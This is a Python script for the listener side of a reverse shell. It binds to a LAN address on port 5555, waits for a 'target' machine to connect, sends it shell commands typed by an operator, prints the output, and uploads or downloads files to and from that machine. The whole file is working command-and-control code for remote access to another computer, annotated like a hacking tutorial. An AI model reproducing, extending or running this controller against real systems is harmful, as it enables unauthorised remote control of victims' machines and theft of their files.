import socket
import json
import os

def reliable_send(data) :
	jsondata = json.dumps(data)	# Converts a Python object into a JSON string
	target.send(jsondata.encode())	# encode and send the command to the target

def reliable_receive() :
	data = ''
	while True :
		try :
			data += target.recv(1024).decode().rstrip()	# decode and receive the results of the command from the target
			return json.loads(data)	# Converts a JSON string into a Python object
		except ValueError :
			continue
			
def upload_file(file_name) :
	f = open(file_name, 'rb')
	target.send(f.read())
			
def download_file(file_name) :
	f = open(file_name, 'wb')
	target.settimeout(1)
	chunck = target.recv(1024)
	while chunck :
		f.write(chunck)
		try :
			chunck = target.recv(1024)
		except socket.timeout as e :
			break
	target.settimeout(None)
	f.close()

def target_Communication() :
	while True :
		command = input("* Shell~%s : " % str(ip))
		reliable_send(command)
		if command == 'quit' :
			break
		elif command == 'clear' :
			os.system('clear')
		elif command[:3] == 'cd ' :	# Taking 'cd ' from 'cd Desktop'
			pass
		elif command[:8] == 'download' :		# download file.txt
			download_file(command[9:])		# server - download, client - upload
		elif command[:6] == 'upload' :
			upload_file(command[7:])
		else :
			result = reliable_receive()
			print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET - ipv4, SOCK_STREAM - TCP protocol
sock.bind(('192.168.136.137',5555))

print("[+] Listening For Incoming Connections : ")
sock.listen(5)	# Listening - max 5 incoming connections - paramenter name is "backlog"

target, ip = sock.accept() # target object and it's ip address is stored respectively
print("[+] Target Connected with : " + str(ip))

target_Communication()	# sends command to the target system - receives response
